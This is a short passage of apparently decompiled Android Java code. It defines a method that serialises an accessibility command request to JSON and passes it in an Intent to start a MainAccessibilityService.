    private static final void runAccessibilityCommand(Command.AccessibilityCommandRequest accessibilityCommandRequest) {
        if (accessibilityCommandRequest != null) {
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), MainAccessibilityService.class);
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            intent.putExtra("command", json.b(Command.AccessibilityCommandRequest.Companion.serializer(), accessibilityCommandRequest));
            companion.getContext().startService(intent);
        }
    }
}
